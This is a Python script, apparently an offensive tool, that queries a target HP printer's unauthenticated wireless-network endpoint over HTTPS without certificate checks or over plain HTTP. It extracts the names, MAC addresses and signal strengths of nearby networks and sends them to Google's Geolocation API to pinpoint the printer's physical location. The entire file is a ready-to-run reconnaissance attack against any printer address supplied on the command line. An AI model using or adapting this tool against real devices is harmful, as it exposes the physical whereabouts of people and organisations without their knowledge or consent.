#!/usr/bin/env python3
"""Geolocate HP Printers using wireless network information


"""
import sys
import re
import json
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# References:
#    https://developers.google.com/maps/documentation/business/geolocation/


# CHANGE THIS to your Google API key, it takes about 5 minutes to get a free one
# See the URL above for instructions
GOOGLE_API_KEY = None
WIFI_URL = '/IoMgmt/Adapters/Wifi0/WifiNetworks'

HEADERS = {
    'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko)',
    'Content-Type' : 'application/json'
}
TIMEOUT = 10
XML_REGEX = re.compile(r'<wifi:SSID>([a-fA-F0-9]+)</wifi:SSID>.+?<wifi:BSSID>([a-fA-F0-9]{12})</wifi:BSSID>.+?<wifi:Channel>([0-9]{1,2})</wifi:Channel>.+?<wifi:dBm>([\-]?[0-9]{0,3})</wifi:dBm>',
                       flags=re.DOTALL)

# Google API test data that should return results
TEST_DATA = [
    {
        "macAddress": "00:25:9c:cf:1c:ac",
        "signalStrength": -43,
        "signalToNoiseRatio": 0
    },
    {
        "macAddress": "00:25:9c:cf:1c:ad",
        "signalStrength": -55,
        "signalToNoiseRatio": 0
    }
]

def query_printer(ip_address):
    """Requests wifi network list from printer

    Args:
        ip_address (str): IP address of target

    Returns:
       str: XML document sent by the printer

    """

    print("\r\nQuerying {} for wireless networks...\r\n".format(ip_address))
    url = 'https://' + ip_address  + WIFI_URL

    try:
        # Supress TLS warnings.. the printer cert won't be legit
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url, verify=False, timeout=TIMEOUT)

    except Exception as error:
        print("\r\nERROR: Error communicating with the target - {}\n".format(error))
        print("Attempting non-TLS connection...")

        try:
            url = 'http://' + ip_address  + WIFI_URL
            response = requests.get(url, verify=False, timeout=TIMEOUT)

        except Exception as error:
            print("\r\nERROR: Error communicating with the target - {}\n".format(error))
            exit(1)

    if not response.status_code == requests.codes.ok:
        print("Something went wrong when communicating to the target:")
        print(response.status_code)
        print(response.headers)
        print(response.content)
        exit(1)

    return response.text

def extract_networks(xml_data):
    """Extracts wifi info from the printer's XML response

    Args:
        xml_data (str): XML printer response

    Returns:
       list: list of dictionary objects where each dict describes a network

    """
    access_points = []
    human_table = []
    network_count = 0

    for (ssid, bssid, channel, dbm) in re.findall(XML_REGEX, xml_data):
        network_count += 1
        # Reformat bare BSSID string into typical MAC address format
        mac_address = ':'.join(bssid[i:i+2] for i in range(0, 12, 2))
        readable_ssid = bytes.fromhex(ssid).decode('utf-8')

        wifi_ap = {
            "macAddress" : mac_address,
            "signalStrength" : dbm,
            "channel" : channel,
            "age" : 0
        }
        access_points.append(wifi_ap)

        human_table.append([readable_ssid, mac_address, channel, dbm])


    # Output a human readable table of the wireless networks that the target can see
    print("The remote target is aware of {} wireless networks...\r\n".format(network_count))

    table_headers = ["SSID", "BSSID", "Channel", "Strength"]

    row_format = "{:<36}{:<20}{:>10}{:>10}"
    print(row_format.format(*table_headers))
    for row in human_table:
        print(row_format.format(*row))


    if network_count < 2:
        print("The Google Geolocation API requires at least two wireless networks but only {} were found.".format(network_count))
        exit(1)

    return access_points


def perform_geo_lookup(wifi_aps):
    """Asks Google's API for the location

    Args:
        wifi_aps (str): list of dictionary objects where each dict describes a network

    Returns:
       Nothing

    """

    uri = 'https://www.googleapis.com/geolocation/v1/geolocate?key=' + GOOGLE_API_KEY

    print("\r\nSending location query to Google...")

    payload = {
        "considerIp": False,
        "wifiAccessPoints": wifi_aps
    }

    try:
        response = requests.post(uri, json=payload, headers=HEADERS, timeout=TIMEOUT)
        location_data = response.text

    except Exception as err:
        print("\r\nERROR: Error communicating with the GoogleAPI service - {}".format(err))
        exit(1)

    if response.status_code == 400:
        if "keyInvalid" in location_data:
            print("\r\nERROR: It appears that your Google API key is invalid")
        else:
            print("\r\nERROR: Unknown error communicating with the GoogleAPI service: {}".format(response))
        exit(1)

    loc_dict = json.loads(location_data)

    if loc_dict and loc_dict.get("location", False):

        latitude = loc_dict["location"].get("lat", None)
        longitude = loc_dict["location"].get("lng", None)
        accuracy = loc_dict.get("accuracy", None)

        print("Google indicates that the target is within %s meters of %s,%s" %  (accuracy, latitude, longitude))
        print("Google Maps URL: https://maps.google.com/?q=%s,%s\r\n" % (latitude, longitude))

    else:
        print("\r\nERROR: Unable to parse Google gelocation response.  The raw data is:")
        print(location_data)


def main():
    try:
        host = str(sys.argv[1])

    except:
        print('Please specifiy a target IP address..')
        exit(1)

    if not GOOGLE_API_KEY:
        print('Please edit the script and update the value fo GOOGLE_API_KEY')
        exit(1)

    printer_resp = query_printer(host)

    access_points = extract_networks(printer_resp)

    #perform_geo_lookup(TEST_DATA)
    perform_geo_lookup(access_points)


if __name__ == "__main__":
    main()
